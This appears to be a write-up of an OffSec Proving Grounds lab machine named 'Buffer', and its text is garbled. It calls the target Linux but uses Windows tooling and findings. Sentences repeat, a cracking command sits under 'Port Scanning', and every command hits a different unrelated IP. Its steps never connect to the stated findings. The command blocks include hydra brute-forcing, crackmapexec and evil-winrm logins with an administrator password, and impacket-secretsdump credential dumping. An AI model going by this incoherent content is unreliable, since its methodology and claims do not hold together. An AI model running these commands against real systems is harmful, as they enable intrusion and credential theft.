---
TitleSEO: "OffSec Proving Grounds — Buffer (Medium Linux) | ZureFX"
TitlePost: "OffSec Proving Grounds — Buffer (Medium Linux)"
Author: "ZureFX"
Description: "Full writeup for OffSec Proving Grounds Buffer. Constrained Delegation and Silver Ticket to achieve medium compromise on Linux."
Keywords: "forensics, pwntilldawn, windows"
URL: "https://zurefx.github.io/writeups/htb-buffer-721.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-buffer-721/"
Date: "2025-11-19"
Tags: "Forensics, PwnTillDawn, Windows"
Section: "writeups"
Lang: "en"
main_img: "htb-buffer-721"
Permalink: "/writeups/htb-buffer-721.html"
BtnLabel: "Read Writeup"
Pick: 1
---
## Machine Info

### Overview

The target **Buffer** is rated **Medium** on OffSec Proving Grounds. It runs **Linux** and the IP address during this analysis was `10.29.228.253`.

### Objectives

The web application was vulnerable to Server-Side Template Injection (SSTI). Network traffic analysis revealed unencrypted communications containing user credentials.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

The service was running without proper input validation, leading to injection vulnerabilities. The service was running without proper input validation, leading to injection vulnerabilities.

### Service Enumeration

Initial enumeration revealed several interesting open ports on the target. Weak file permissions allowed modification of critical system files. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
nmap -sCV -p8888,8080,587 10.109.140.224 -oN scan.txt
nmap -sCV -p53,27017,636 10.98.164.88 -oN scan.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.25.54.200/FUZZ
```

The application stored sensitive credentials in an unencrypted configuration file. Initial enumeration revealed several interesting open ports on the target.

### SMB Enumeration

Privilege escalation was possible due to misconfigured sudo permissions. Group Policy Preferences contained encrypted but recoverable credentials.

```bash
gobuster dir -u http://10.88.29.21/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Group Policy Preferences contained encrypted but recoverable credentials. The application stored sensitive credentials in an unencrypted configuration file. The database credentials were hardcoded in the application source code.

## Exploitation

### Vulnerability Identification

Privilege escalation was possible due to misconfigured sudo permissions. The scheduled task ran with elevated privileges and could be abused for escalation. Weak file permissions allowed modification of critical system files.

Key finding: **Constrained Delegation**.

The database credentials were hardcoded in the application source code. The application stored sensitive credentials in an unencrypted configuration file.

### Initial Access

Group Policy Preferences contained encrypted but recoverable credentials. Group Policy Preferences contained encrypted but recoverable credentials.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
crackmapexec smb 10.63.143.96 -u administrator -p 'P@ssw0rd!' --shares
evil-winrm -i 10.111.245.235 -u administrator -p 'P@ssw0rd!'
```

Group Policy Preferences contained encrypted but recoverable credentials. Command injection was possible through unsanitized user input in the search functionality. The service was running without proper input validation, leading to injection vulnerabilities.

## Privilege Escalation

### Enumeration

The backup files contained sensitive information that should not have been accessible. The application stored sensitive credentials in an unencrypted configuration file. Unconstrained delegation was enabled on the compromised machine.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.58.150.29 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
crackmapexec smb 10.55.191.191 -u administrator -p 'P@ssw0rd!' --shares
nmap -sCV -p8080,1433,80 10.48.125.224 -oN scan.txt
feroxbuster -h
```

### Exploitation

The application stored sensitive credentials in an unencrypted configuration file. The database credentials were hardcoded in the application source code.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.77.65.135
gobuster dir -u http://10.93.161.23/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

The scheduled task ran with elevated privileges and could be abused for escalation. Token impersonation allowed elevation to SYSTEM privileges on the target.

### Root/SYSTEM

Successfully obtained **root** access on the target.

The target system was identified as running a vulnerable version of the service. The service was running without proper input validation, leading to injection vulnerabilities.

## Summary

### Tools Used

- `hydra`
- `rpcclient`
- `nikto`
- `mimikatz`
- `feroxbuster`
- `dcomexec`
- `ldapsearch`
- `ligolo-ng`

### Key Takeaways

- Constrained Delegation
- Silver Ticket
